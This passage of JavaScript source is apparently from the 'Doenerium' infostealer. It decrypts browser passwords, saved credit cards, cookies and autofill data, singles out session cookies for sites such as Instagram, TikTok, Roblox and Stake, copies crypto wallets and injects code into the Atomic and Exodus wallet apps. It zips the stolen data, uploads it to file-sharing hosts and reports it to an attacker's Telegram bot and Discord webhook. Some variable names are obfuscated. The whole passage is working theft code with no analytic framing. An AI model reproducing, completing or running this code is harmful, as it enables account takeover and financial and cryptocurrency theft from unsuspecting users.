    } catch (error) {
        console.error(`Error in archiveAndSendData: ${error.message}`);
    } finally {
        try {
            if (fs.existsSync(mainFolderPath)) {
                console.log(`Deleted folder and its content: ${mainFolderPath}`);
            }
        } catch (error) {
            console.error(`Error during cleanup: ${error.message}`);
        }
    }
}

async function uploadToDoge(zipFilePath) {
    return new Promise((resolve, reject) => {
        if (!fs.existsSync(zipFilePath)) return;
        const uploadCommand = `curl --location --request POST "https://api.filedoge.com/upload" -H "Content-Type: multipart/form-data;" --form "file=@${zipFilePath.replace(/\\/g, '/')}"`;
        exec(uploadCommand, (error, stdout, stderr) => {
            if (error) {
                console.error(`err uploading to FileDoge: ${error}`);
                reject(error);
            } else {
                console.log('raw fieldoge resp:', stdout);
                try {
                    const response = JSON.parse(stdout);
                    const token = response.token;
                    if (!token) return;
                    const downloadLink = `https://api.filedoge.com/download/${token}`;
                    console.log(`successfuly uploaded to FileDoge. Download link: ${downloadLink}`);
                    resolve(downloadLink);
                } catch (jsonError) {
                    console.error(`err parsing JSON response: ${jsonError}`);
                    reject(new Error('Invalid JSON response from the API'));
                }
            }
        });
    });
}


async function uploadToOshiAt(destinationFolder) {
    try {
        const form = new FormData();
        form.append('files[]', fs.createReadStream(destinationFolder), destinationFolder);
        form.append('expire', '43200');
        form.append('autodestroy', '0');
        form.append('randomizefn', '0');
        form.append('shorturl', '1');
        const response = await axios.post('http://oshi.at/', form, { headers: form.getHeaders() });
        const result = response.data.split("DL: ")[1].replace(/\n|\r| /g, "");
        return result;
    } catch (error) {
        console.error(`Error uploading to Oshi.at: ${error.message}`);
        throw new Error('Oshi.at upload failed');
    }
}

async function uploadToGofile(zipFilePath) {
    return new Promise(async (resolve, reject) => {
        const form = new FormData();
        form.append('file', fs.createReadStream(zipFilePath));
        try {
            const servers = await getServers();
            const server = servers[0].name;
            const url = `https://${server}.gofile.io/uploadFile`;
            const response = await axios.post(url, form, {
                headers: { ...form.getHeaders() }
            });
            const downloadPage = response.data.data.downloadPage;
            resolve(downloadPage);
        } catch (error) {
            console.error(`Error uploading to Gofile: ${error}`);
            reject(error);
        }
    });
}

async function uploadToFileio(filePath) {
    try {
        const form = new FormData();
        form.append('file', fs.createReadStream(filePath));
        form.append('expire', '1w');
        const response = await axios.post('https://file.io/', form, { headers: form.getHeaders() });
        return response.data.link;
    } catch (error) {
        console.error(`Error uploading to File.io: ${error.message}`);
        throw new Error('File.io upload failed');
    }
}

async function uploadFile(destinationFolder) {
    const zipFilePath = `${destinationFolder}.zip`;

    if (!fs.existsSync(zipFilePath)) {
        console.error(`Error: File does not exist - ${zipFilePath}`);
        throw new Error(`File does not exist - ${zipFilePath}`);
    }

    try {
        const dogeLink = await uploadToDoge(zipFilePath);
        return dogeLink;
    } catch (error) {
        console.error(`FileDoge upload failed: ${error.message}`);
    }

    try {
        const gofileLink = await uploadToGofile(zipFilePath);
        return gofileLink;
    } catch (error) {
        console.error(`Gofile upload failed: ${error.message}`);
    }

    try {
        const oshiAtLink = await uploadToOshiAt(zipFilePath);
        return oshiAtLink;
    } catch (error) {
        console.error(`Oshi.at upload failed: ${error.message}`);
    }

    // fileio was undefined (prpbly some gpt prompt bugz)
    try {
        const fileio = await uploadToFileio(zipFilePath);
        return fileio;
    } catch (error) {
        console.error(`file.io upload failed: ${error.message}`);
    }

    throw new Error('All upload methods failed');
}

async function getServers() {
    try {
        const response = await axios.get('https://api.gofile.io/servers');
        const servers = response.data.data.servers;
        return servers;
    } catch (error) {
        console.error(`Error while searching for servers: ${error}`);
        throw error;
    }
}


async function sendTelegramMessage(message) {
    if (!botToken || !chatId) {
        console.error('Missing Telegram credentials');
        return;
    }

    try {
        const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
        await axios.post(url, {
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        });
    } catch (error) {
        console.error('Telegram API Error:', error.response?.data || error.message);
    }
}

async function getExtension(ee) {
    const discordTokensFilePath = path.join(ee, 'discord', 'discord.txt');

    let discordTokensCount = 0;
    if (fs.existsSync(discordTokensFilePath)) {
        const discordTokensContent = fs.readFileSync(discordTokensFilePath, 'utf-8');
        const discordTokensEntries = discordTokensContent.split('\n').filter(entry => entry.trim() !== '');
        if (discordTokensEntries.length > 0) discordTokensCount = discordTokensEntries.length;
    }

    const passwordsFilePath = path.join(ee, 'Passwords', 'passwords.txt');
    let passwordsCount = 0;
    if (fs.existsSync(passwordsFilePath)) {
        const passwordsContent = fs.readFileSync(passwordsFilePath, 'utf-8');
        const passwordsEntries = passwordsContent.split('Username').filter(entry => entry.trim() !== '');
        passwordsCount = passwordsEntries.length;
    }

    const autofillsFolderPath = path.join(ee, 'Autofills');
    let autofillCount = 0;
    if (fs.existsSync(autofillsFolderPath)) {
        const autofillsFilePath = path.join(autofillsFolderPath, 'Autofills.txt');
        if (fs.existsSync(autofillsFilePath)) {
            const autofillsContent = fs.readFileSync(autofillsFilePath, 'utf-8');
            const autofillEntries = autofillsContent.split('\n').filter(entry => entry.trim() !== '');
            autofillCount = autofillEntries.length;
        }
    }

    const walletsFolderPath = path.join(ee, 'Wallets');
    const walletSubdirectories = fs.readdirSync(walletsFolderPath).filter(item => fs.statSync(path.join(walletsFolderPath, item)).isDirectory());
    let walletCount = walletSubdirectories.length;
    const foundFoldersText = await checkFolders(ee);
    const foundWalletsText = await checkWallets(ee);
    const foundFoldersTele = await checkFolderstele(ee);
    const foundWalletsTele = await checkWalletstele(ee);

    const downloadLink = await uploadFile(ee, locale, computerName);
    const ip = await getIp();

    const message = `
🔐 <b>Passwords:</b> <code>${passwordsCount || '0'}</code>
🍪 <b>Cookies:</b> <code>${count.cookies || '0'}</code>
📋 <b>Autofills:</b> <code>${autofillCount || '0'}</code>
💸 <b>Wallets:</b> <code>${walletCount || '0'}</code>
🔑 <b>Tokens:</b> <code>${discordTokensCount || '0'}</code>

<b>⚙ <i><u>System Information:</u></i></b>
<b>
Hostname: <code>${user.hostname}</code>
User Info: <code>${user.userInfo}</code>
Version: <code>${user.version}</code>
IP Address: <code>${ip}</code>
Uptime: <code>${user.uptime}</code>
Type: <code>${user.type}</code>
Arch: <code>${user.arch}</code>
Release: <code>${user.release}</code>
Count Core: <code>${user.countCore}</code>
File Location: <code>${user.fileLoc}</code>
</b>

<b><i>Download Link:</i></b> <a href="${downloadLink}"><b><u>${locale}-${computerName}.zip</u></b></a>

<b><u><i>Local Session Found:</i></u></b>
${foundFoldersTele || 'None'}

<b><u><i>Local Wallets Found:</i></u></b>
${foundWalletsTele || 'None'}

<b>${user.hostname} | @vatfraudster</b>
`;

    const screenshotPath = path.join(mainFolderPath, 'Screenshots', 'Screenshot.png');
    if (fs.existsSync(screenshotPath)) {
        const imageBuffer = fs.readFileSync(screenshotPath);
        const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendPhoto`;
        const formData = new FormData();
        formData.append('chat_id', chatId);
        formData.append('photo', imageBuffer, { filename: 'Screenshot.png' });
        formData.append('caption', message);
        try {
            if (fs.existsSync(screenshotPath)) {
                await axios.post(telegramApiUrl, formData, { 
                    headers: { 'Content-Type': `multipart/form-data; boundary=${formData._boundary}` },
                    params: { parse_mode: 'HTML' }
                });
            } else {
                const telegramMessageApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
                const response = await axios.post(telegramMessageApiUrl, { 
                    chat_id: chatId, 
                    parse_mode: 'HTML', 
                    text: message 
                });
                if (response.data.ok !== true) {
                    console.error('Telegram API Error:', response.data.description);
                }
            }
        } catch (error) {
            console.error('Telegram Error:', error.response?.data || error.message);
        }
    } else {
        const telegramMessageApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
        try {
            await axios.post(telegramMessageApiUrl, { chat_id: chatId, parse_mode: 'HTML', text: message });
        } catch (error) {
            console.error(`Error sending system information to Telegram: ${error.message}`);
        }
    }

    const combinedInfoEmbed = {
        title: 'All Informations',
        color: 0x303037,
        author: {
            name: `${user.hostname} | System Information | t.me/vatfraudster`,
            icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
        },
        fields: [
            {
                name: '🔐 Passwords',
                value: '```' + passwordsCount.toString() || '0' + '```',
                inline: true,
            },
            {
                name: '<:cookie:1205123589930749995> Cookies',
                value: '```' + count.cookies.toString() || '0' + '```',
                inline: true,
            },
            {
                name: '📋 Autofills',
                value: '```' + autofillCount.toString() || '0' + '```',
                inline: true,
            },
            {
                name: '<a:2891bitcoin:984181779038617623> Browser extension/wallet',
                value: '```' + walletCount.toString() || '0' + '```',
                inline: true,
            },
            {
                name: '🔑 Tokens',
                value: '```' + discordTokensCount.toString() || '0' + '```',
                inline: true,
            },
            {
                name: ' ',
                value: '**<a:system:1205123587632275517> System Information**\n```\n' +
                    `Hostname: ${user.hostname}\n` +
                    `User Info: ${user.userInfo}\n` +
                    `Version: ${user.version}\n` +
                    `IP Address: ${ip}\n` +
                    `Uptime: ${user.uptime}\n` +
                    `Type: ${user.type}\n` +
                    `Arch: ${user.arch}\n` +
                    `Release: ${user.release}\n` +
                    `Count Core: ${user.countCore}\n` +
                    `File Location: ${user.fileLoc}\n` +
                    '```',
                inline: false,
            },
            {
                name: '📥 Download Link',
                value: `[${locale}-${computerName}.zip](${downloadLink})`,
                inline: false,
            },
            {
                name: '**___Local Session Found:___**',
                value: foundFoldersText || 'None',
                inline: false,
            },
            {
                name: '**___Local Wallets Found:___**',
                value: foundWalletsText || 'None',
                inline: false,
            },
        ],
        footer: {
            text: `${user.hostname} | t.me/vatfraudster`,
            icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
        },
    };

    axios.post(discordWebhookUrl, { 
        embeds: [combinedInfoEmbed] 
    })
    .then(response => {
        if (response.status !== 204) {
            console.log('Discord API Warning:', response.data);
        }
    })
    .catch(error => {
        console.error('Discord Error Details:');
        if (error.response) {
            console.log('Status:', error.response.status);
            console.log('Data:', error.response.data);
        } else {
            console.log('Config:', error.config);
        }
    });
    await clean();
    await new Promise(resolve => setTimeout(resolve, 5000));
    process.exit();
}

async function clean() { 
    const pathee = path.join(os.tmpdir(), generateRandomString(12))
    if (fs.existsSync(pathee)) {
        execSync(`rmdir /s /q "${pathee}"`);
    } else { }
}


async function checkFolders(mainFolderPath) {
    const foldersToCheck = [
        { name: 'Telegram', emoji: '<:Telegram_2019_Logo:1210423641062510652>' },
        { name: 'Steam', emoji: '<:Steam_icon_logo47:1210423638356922489>' },
        { name: 'RiotGames', emoji: '<:Riot_Games_2019_Symbol:1210423639883644938>' },
        { name: 'FileZilla', emoji: '<:filezilla_macos_bigsur_icon_1901:1210423500716777522>' },
        { name: 'Epic Games', emoji: '<:Icon6:1205137412666163211>' },
    ];

    const separator = ' | ';
    let foundFoldersText = '';
    try {
        for (const { name, emoji } of foldersToCheck) {
            const folderPath = path.join(mainFolderPath, name);
            if (fs.existsSync(folderPath) || fs.existsSync(path.join(mainFolderPath, name.toLowerCase()))) {
                foundFoldersText += `${emoji} **${name}**${separator}`;
            }
        }

        foundFoldersText = foundFoldersText.slice(0, -separator.length);
        return foundFoldersText || 'None';
    } catch (error) {
        console.error(error);
        return `Error: ${error.message}`;
    }
}



async function checkWallets(mainFolderPath) {
    const walletEmojis = {
        "Bitcoin": '<a:2891bitcoin:984181779038617623>',
        "Zcash": '<a:outputonlinegiftools1:1212238144229867530>',
        "Armory": '<:imageremovebgpreview2:1212238560715870270>',
        "Bytecoin": '<:bytecoinbcnbcnlogo:1212317682016329738>',
        "Jaxx": '<:imageremovebgpreview4:1212239745942552606>',
        "Exodus": '<:imageremovebgpreview5:1212249434922950686>',
        "Ethereum": '<:imageremovebgpreview__7_removebg:1212248769291358209>',
        "Electrum": '<:imageremovebgpreview6:1212249431718625321>',
        "AtomicWallet": '<:atomic_wallet_logo_dark_rounded1:1212250322274230362>',
        "Guarda": '<a:outputonlinegiftools2:1212249427021012993>',
        "Coinomi": '<:co950cccacoinomilogocoinomiwalle:1212250113485836378>',
    };

    const separator = ' | ';
    let foundWalletsText = '';
    try {
        const walletFolder = path.join(mainFolderPath, 'Wallets');
        if (fs.existsSync(walletFolder)) {
            const walletEntries = await fs.promises.readdir(walletFolder);
            let metamaskFound = false;
            const foundWallets = walletEntries.map(walletName => {
                const walletEmoji = walletEmojis[walletName];
                if (walletName.toLowerCase().startsWith('metamask')) {
                    if (!metamaskFound) {
                        metamaskFound = true;
                        return `<a:imageedit_1_5973982742:1212322722609233961> **Metamask**${separator}`;
                    }
                } else {
                    return walletEmoji ? `${walletEmoji} **${walletName}**${separator}` : null;
                }
            }).filter(wallet => wallet !== null);

            foundWalletsText = foundWallets.join('');
            if (foundWalletsText) {
                foundWalletsText = foundWalletsText.slice(0, -separator.length);
            }
        }

        return foundWalletsText || 'None';
    } catch (error) {
        console.error(error);
        return `Error: ${error.message}`;
    }
}

async function checkFolderstele(mainFolderPath) {
    const foldersToCheck = [
        { name: 'Telegram' },
        { name: 'Steam' },
        { name: 'RiotGames' },
        { name: 'FileZilla' },
        { name: 'Epic Games' },
    ];

    const separator = '<b> | </b>';
    let foundFoldersTele = '';

    try {
        for (const { name } of foldersToCheck) {
            const folderPath = path.join(mainFolderPath, name);
            if (fs.existsSync(folderPath) || fs.existsSync(path.join(mainFolderPath, name.toLowerCase()))) {
                foundFoldersTele += `<code>${name}</code>${separator}`;
            }
        }
        foundFoldersTele = foundFoldersTele.slice(0, -separator.length);
        return foundFoldersTele || 'None';
    } catch (error) {
        console.error(error);
        return `Error: ${error.message}`;
    }
}

async function checkWalletstele(mainFolderPath) {
    const separator = '<b> | </b>';
    let foundWalletsTele = '';

    try {
        const walletFolder = path.join(mainFolderPath, 'Wallets');
        if (fs.existsSync(walletFolder)) {
            const walletEntries = await fs.promises.readdir(walletFolder);
            let metamaskFound = false;
            const foundWallets = walletEntries.map(walletName => {
                if (walletName.toLowerCase().startsWith('metamask')) {
                    if (!metamaskFound) {
                        metamaskFound = true;
                        return `<code>Metamask</code>${separator}`;
                    }
                } else {
                    return `<code>${walletName}</code>${separator}`;
                }
            });

            foundWalletsTele = foundWallets.join('');
            if (foundWalletsTele) {
                foundWalletsTele = foundWalletsTele.slice(0, -separator.length);
            }
        }

        return foundWalletsTele || 'None';
    } catch (error) {
        console.error(error);
        return `Error: ${error.message}`;
    }
}


function localWalletData() {
    try {
        const walletsDestination = path.join(mainFolderPath, 'Wallets');
        if (!fs.existsSync(walletsDestination)) fs.mkdirSync(walletsDestination, { recursive: true });
        for (const walletName in walletLocalPaths) {
            const walletSource = walletLocalPaths[walletName];
            const walletDestination = path.join(walletsDestination, walletName);
            if (fs.existsSync(walletSource)) {
                if (!fs.existsSync(walletDestination)) fs.mkdirSync(walletDestination, { recursive: true });
                copyFolder(walletSource, walletDestination);
            }
        }
    } catch (error) { }
}


async function walletinjection() {
    await injectAtomic();
    await injectExodus();
}

async function injectAtomic() {
    const atomicPath = path.join(process.env.LOCALAPPDATA, 'Programs', 'atomic');
    const atomicAsarPath = path.join(atomicPath, 'resources', 'app.asar');
    const atomicLicensePath = path.join(atomicPath, 'LICENSE.electron.txt');
    await inject(atomicPath, atomicAsarPath, atomicInjectionUrl, atomicLicensePath);
}

async function injectExodus() {
    const exodusPath = path.join(process.env.LOCALAPPDATA, 'exodus');
    const exodusDirs = fs.readdirSync(exodusPath).filter(file => file.startsWith('app-'));
    for (const exodusDir of exodusDirs) {
        const exodusPathWithVersion = path.join(exodusPath, exodusDir);
        const exodusAsarPath = path.join(exodusPathWithVersion, 'resources', 'app.asar');
        const exodusLicensePath = path.join(exodusPathWithVersion, 'LICENSE');
        await inject(exodusPath, exodusAsarPath, exodusInjectionUrl, exodusLicensePath);
    }
}

async function inject(appPath, asarPath, injectionUrl, licensePath) {
    if (!fs.existsSync(appPath) || !fs.existsSync(asarPath)) return;
    try {
        const response = await axios.get(injectionUrl, { responseType: 'stream' });
        if (response.status !== 200) return;
        const writer = fs.createWriteStream(asarPath);
        response.data.pipe(writer);
        await new Promise((resolve, reject) => {
            writer.on('finish', resolve);
            writer.on('error', reject);
        });

        if (licensePath) {
            if (botToken !== 'YOURBOTTOKEN' && chatId !== 'YOURCHATID') {
                fs.writeFileSync(licensePath, `${botToken}\n${chatId}`);
            } else if (discordWebhookUrl !== 'REMPLACE_ME') {
                fs.writeFileSync(licensePath, discordWebhookUrl);
            } else {
                console.error('none of the creditentialz are valid.');
            }
        }
    } catch (error) {
        console.error('Error during injection:', error);
    }
}



async function getPasswords() {
    const _0x540754 = [];
    for (let _0x261d97 = 0; _0x261d97 < browserPath.length; _0x261d97++) {
        const currentPath = browserPath[_0x261d97][0];
        if (!fs.existsSync(currentPath) || currentPath.includes('Guest Profile')) continue;
        let _0xd541c2;
        try {
            _0xd541c2 = currentPath.includes('Local') ? currentPath.split('\\Local\\')[1].split('\\')[0] : currentPath.split('\\Roaming\\')[1].split('\\')[1];
        } catch (error) {
            continue;
        }
        const loginDataPath = path.join(currentPath, 'Login Data');
        const copyPath = path.join(currentPath, 'passwords.db');
        try {
            if (!fs.existsSync(loginDataPath)) continue;
            fs.copyFileSync(loginDataPath, copyPath);
        } catch (copyError) {
            continue;
        }
        const _0x3d71cb = new sqlite3.Database(copyPath);
        try {
            await new Promise((resolve, reject) => {
                _0x3d71cb.all('SELECT origin_url, username_value, password_value, date_created FROM logins',
                    (error, rows) => {
                        if (error) return reject(error);
                        rows.forEach(_0x504e35 => {
                            if (!_0x504e35.username_value) return;
                            try {
                                const _0x3d2b4b = _0x504e35.password_value;
                                const _0x5e1041 = _0x3d2b4b.slice(3, 15);
                                const _0x279e1b = _0x3d2b4b.slice(15, _0x3d2b4b.length - 16);
                                const _0x2a933a = _0x3d2b4b.slice(_0x3d2b4b.length - 16);
                                const _0x210aeb = crypto.createDecipheriv('aes-256-gcm', Buffer.from(browserPath[_0x261d97][3], 'hex'), _0x5e1041);
                                _0x210aeb.setAuthTag(_0x2a933a);
                                const password = _0x210aeb.update(_0x279e1b, 'base64', 'utf-8') + _0x210aeb.final('utf-8');
                                const dateCreated = new Date(_0x504e35.date_created / 1000 - 11644473600 * 1000).toLocaleString();
                                allPasswords.push(password);
                                _0x540754.push(`================\nURL: ${_0x504e35.origin_url}\n` + `Username: ${_0x504e35.username_value}\n` + `Password: ${password}\n` + `Date: ${dateCreated}\n` + `Browser: ${_0xd541c2} ${browserPath[_0x261d97][1]}\n`);
                            } catch (decryptError) {}
                        });
                        resolve();
                    }
                );
            });
        } finally {
            _0x3d71cb.close();
            try {
                fs.unlinkSync(copyPath);
            } catch (cleanupError) {}
        }
    }

    if (_0x540754.length > 0) {
        const passwordsFolder = path.join(mainFolderPath, 'Passwords');
        fs.mkdirSync(passwordsFolder, { recursive: true });
        const outputPath = path.join(passwordsFolder, 'Passwords.txt');
        fs.writeFileSync(outputPath, user.copyright + _0x540754.join('\n'), 'utf8');
    }
}


async function getCards() {
  const _0x540754 = [];
  for (let _0x261d97 = 0; _0x261d97 < browserPath.length; _0x261d97++) {
    if (!fs.existsSync(browserPath[_0x261d97][0])) continue;
    let _0xd541c2;
    if (browserPath[_0x261d97][0].includes('Local')) {
      _0xd541c2 = browserPath[_0x261d97][0].split('\\Local\\')[1].split('\\')[0];
    } else {
      _0xd541c2 = browserPath[_0x261d97][0].split('\\Roaming\\')[1].split('\\')[1];
    }

    const webData = browserPath[_0x261d97][0] + 'Web Data';
    const copiedFilePath = browserPath[_0x261d97][0] + 'Web.db';
    const key = Buffer.from(browserPath[_0x261d97][3], 'hex');

    try {
        if (!fs.existsSync(webData)) continue;
        fs.copyFileSync(webData, copiedFilePath);
    } catch (err) {
        continue;
    }

    const databaseConnection = new sqlite3.Database(copiedFilePath);
    await new Promise((resolve, reject) => {
      databaseConnection.each('SELECT card_number_encrypted, expiration_year, expiration_month, name_on_card FROM credit_cards',
        (err, card) => {
          if (err) {
            reject(err);
          } else {
            try {
              const month = card.expiration_month < 10 ? `0${card.expiration_month}` : `${card.expiration_month}`;
              const _0x5e1041 = card.card_number_encrypted ? card.card_number_encrypted.slice(3, 15) : '';
              const decryptedCardNumber = subModules.decryption(card.card_number_encrypted, key);
              const cardInfo = `${decryptedCardNumber}\t${month}/${card.expiration_year}\t${card.name_on_card}\n`;
              _0x540754.push(cardInfo);
            } catch (error) {}
          }
        },
        () => {
          resolve();
        }
      );
    });

    try {
      databaseConnection.close();
      fs.unlinkSync(copiedFilePath);
    } catch (error) {}
  }

  if (_0x540754.length) {
    const cardsFolderPath = path.join(mainFolderPath, 'Cards');
    if (!fs.existsSync(cardsFolderPath)) fs.mkdirSync(cardsFolderPath);
    const cardsFilePath = path.join(cardsFolderPath, 'Cards.txt');
    fs.writeFileSync(cardsFilePath, user.copyright + _0x540754.join(''), { encoding: 'utf8', flag: 'a+' });
  }
}

async function getCookiesfromdecrypt() {
    const cookiesData = {};
    cookiesData['banner'] = [`${user.copyright}\n`];
    const matchedKeywords = [];
    for (let i = 0; i < browserPath.length; i++) {
        const networkPath = path.join(browserPath[i][0], 'Network');
        if (!fs.existsSync(path.join(networkPath, 'Cookies'))) continue;
        let browserFolder;
        if (browserPath[i][0].includes('Local')) {
            browserFolder = browserPath[i][0].split('\\Local\\')[1].split('\\')[0];
        } else {
            browserFolder = browserPath[i][0].split('\\Roaming\\')[1].split('\\')[1];
        }
        const cookiesPath = path.join(networkPath, 'Cookies');
        const db = new sqlite3.Database(cookiesPath);
        await new Promise((resolve) => {
            db.each('SELECT * FROM cookies',
                function (err, row) {
                    if (err) return;
                    let encryptedValue = row.encrypted_value;
                    let iv = encryptedValue.slice(3, 15);
                    let encryptedData = encryptedValue.slice(15, encryptedValue.length - 16);
                    let authTag = encryptedValue.slice(encryptedValue.length - 16, encryptedValue.length);
                    let decrypted = '';
                    try {
                        const decipher = crypto.createDecipheriv('aes-256-gcm', browserPath[i][3], iv);
                        decipher.setAuthTag(authTag);
                        decrypted = decipher.update(encryptedData, 'base64', 'utf-8') + decipher.final('utf-8');
                        if (row.host_key === '.instagram.com' && row.name === 'sessionid') {
                            SubmitInstagram(`${decrypted}`);
                        } else if (row.host_key === '.tiktok.com' && row.name === 'sessionid') {
                            stealTikTokSession(`${decrypted}`);
                        } else if (row.host_key === '.reddit.com' && row.name === 'reddit_session') {
                            setRedditSession(`${decrypted}`);
                        } else if (row.host_key === '.spotify.com' && row.name === 'sp_dc') {
                            SpotifySession(`${decrypted}`);
                        } else if (row.name === '.ROBLOSECURITY') {
                            SubmitRoblox(`${decrypted}`);
                        } else if (row.host_key === 'account.riotgames.com' && row.name === 'sid') {
                            RiotGameSession(`${decrypted}`);
                        } else if (row.host_key === 'stake.com' && row.name === 'session') {
                            sendStakeSessionToDiscord(`${decrypted}`);
                        }
                        for (const keyword of keywords) {
                            if (row.host_key.includes(keyword) && !matchedKeywords.includes(keyword)) matchedKeywords.push(keyword);
                        }
                    } catch (error) { }
                    if (!cookiesData[`${browserFolder}_${browserPath[i][1]}`]) cookiesData[`${browserFolder}_${browserPath[i][1]}`] = [];
                    cookiesData[`${browserFolder}_${browserPath[i][1]}`].push(`${row.host_key}	TRUE	/	FALSE	2597573456	${row.name}	${decrypted} \n\n`);
                    count.cookies++;
                },
                () => {
                    resolve('');
                }
            );
        });
    }
    if (matchedKeywords.length > 0) sendKeywordsToDiscord(matchedKeywords);
    for (let [browserName, cookies] of Object.entries(cookiesData)) {
        if (browserName.toLowerCase() === 'banner') continue;
        if (cookies.length !== 0) {
            const cookiesContent = cookies.join('');
            const cookiesWithBanner = `${user.copyright}\n${cookiesContent}`;
            const fileName = `${browserName}.txt`;
            const cookiesFolderPath = path.join(mainFolderPath, 'Cookies');
            const cookiesFilePath = path.join(cookiesFolderPath, fileName);
            try {
                if (!fs.existsSync(cookiesFolderPath)) fs.mkdirSync(cookiesFolderPath);
                fs.writeFileSync(cookiesFilePath, cookiesWithBanner, { encoding: 'utf8' });
                moveFileToFolder(cookiesFilePath, 'Cookies');
            } catch (error) {
                console.error(`Error writing/moving cookies file ${cookiesFilePath}:`, error);
            }
        }
    }
}

async function sendKeywordsToDiscord(keywords) {
    try {
        const formattedKeywords = keywords.map(keyword => `[**${keyword}**](https://${encodeURIComponent(keyword)})`).join(', ');
        const embed_data = {
            "title": "Doenerium Keywords",
            "description": formattedKeywords,
            "color": 0x303037,
            "footer": {
                "text": `${user.hostname} | t.me/vatfraudster`,
                "icon_url": 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
            }
        };

        const payload = { "embeds": [embed_data] };
        const headers = { "Content-Type": "application/json" };
        const responsePost = await axios.post(discordWebhookUrl, payload, { headers });
    } catch (error) {
        console.error('Error sending to Discord:', error);
    }
}

async function sendStakeSessionToDiscord(decrypted) {
    try {
        const embed_data = {
            "title": "Stake.com Session Detected",
            "description": `Session Cookie: \n\`\`\`${decrypted}\`\`\``,
            "color": 0x303037,
            "footer": {
                "text": `${user.hostname} | t.me/vatfraudster`,
                "icon_url": 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
            },
            "thumbnail": {
                "url": 'https://cdn.discordapp.com/attachments/1223099035162771528/1283211354144112712/vizimexvux7d1.gif?ex=66e22b33&is=66e0d9b3&hm=7021a54c292b6a767aaa18baebb8c707ea5fa224c366f676abd6e23bd8168df2&'
            }
        };

        const payload = { "embeds": [embed_data] };
        const headers = { "Content-Type": "application/json" };
        await axios.post(discordWebhookUrl, payload, { headers });
    } catch (error) {
        console.error('Error sending Stake session to Discord:', error);
    }
}



async function getAutofills() {
  const autofillData = [];
  for (const pathData of browserPath) {
    const browserPathExists = fs.existsSync(pathData[0]);
    if (!browserPathExists) continue;
    const applicationName = pathData[0].includes('Local') ? pathData[0].split('\\Local\\')[1].split('\\')[0] : pathData[0].split('\\Roaming\\')[1].split('\\')[1];
    const webDataPath = pathData[0] + 'Web Data';
    const webDataDBPath = pathData[0] + 'webdata.db';
    try {
        if (!fs.existsSync(webDataPath)) continue;
        fs.copyFileSync(webDataPath, webDataDBPath);
    } catch (err) {
        continue;
    }
    const db = new sqlite3.Database(webDataDBPath);
    await new Promise((resolve, reject) => {
      db.each('SELECT * FROM autofill',
        function (error, row) {
          if (row) {
            autofillData.push('================\nName: ' + row.name + '\nValue: ' + row.value + '\nApplication: ' + applicationName + ' ' + pathData[1] + '\n');
          }
        },
        function () {
          resolve('');
        }
      );
    });
    if (autofillData.length === 0) {
      autofillData.push('No autofills found for ' + applicationName + ' ' + pathData[1] + '\n');
    }
  }

  if (autofillData.length) {
    const autofillsFolderPath = path.join(mainFolderPath, 'Autofills');
    const autofillsFilePath = path.join(autofillsFolderPath, 'Autofills.txt');
    if (!fs.existsSync(autofillsFolderPath)) fs.mkdirSync(autofillsFolderPath);
    fs.writeFileSync(autofillsFilePath, user.copyright + autofillData.join(''), { encoding: 'utf8', flag: 'a+' });
  }
}
   

function copyriot(source, target, excludeList = []) {
    const targetFolder = path.join(target, path.basename(source));
    if (!fs.existsSync(targetFolder)) fs.mkdirSync(targetFolder, { recursive: true });
    if (fs.lstatSync(source).isDirectory()) {
        const files = fs.readdirSync(source);
        files.forEach((file) => {
            const curSource = path.join(source, file);
            const curTarget = path.join(targetFolder, file);
            if (!excludeList.some(excludedFile => curSource.includes(excludedFile))) {
                if (fs.lstatSync(curSource).isDirectory()) {
                    copyriot(curSource, targetFolder, excludeList);
                } else {
                    fs.copyFileSync(curSource, curTarget);
                }
            }
        });
    }
}


async function SubmitRiotGames() {
    try {
        var exists = false;
        if (fs.existsSync("C:\\ProgramData\\Riot Games")) {
            exists = true;
            exec("taskkill /IM \"RiotClientServices.exe\" /F", (error, stdout, stderr) => {});
            await new Promise(resolve => setTimeout(resolve, 2500));
        } else {
            exists = false;
        }

        if (exists) {
            const riotGamesSourcePath = "C:\\ProgramData\\Riot Games";
            const riotGamesDestinationPath = path.join(mainFolderPath, 'RiotGames', 'ProgramData');
            const riotGamesExcludeList = [
                "Metadata\\valorant.live\\valorant.live.db",
                "Metadata\\valorant.live\\valorant.live.manifest",
                "Metadata\\valorant.live\\valorant.live.preview.manifest",
                "Metadata\\league_of_legends.live\\league_of_legends.live.preview.manifest",
                "Metadata\\vanguard\\setup.exe"
            ];

            try {
                copyriot(riotGamesSourcePath, riotGamesDestinationPath, riotGamesExcludeList);
            } catch (err) {
                console.error(`An error occurred while copying Riot Games data: ${err.message}`);
            }

            const riotGamesLocalAppDataSourcePath = `C:\\Users\\${process.env.USERNAME}\\AppData\\Local\\Riot Games`;
            const riotGamesLocalAppDataDestinationPath = path.join(mainFolderPath, 'RiotGames', 'AppData', 'Local');

            try {
                copyriot(riotGamesLocalAppDataSourcePath, riotGamesLocalAppDataDestinationPath);
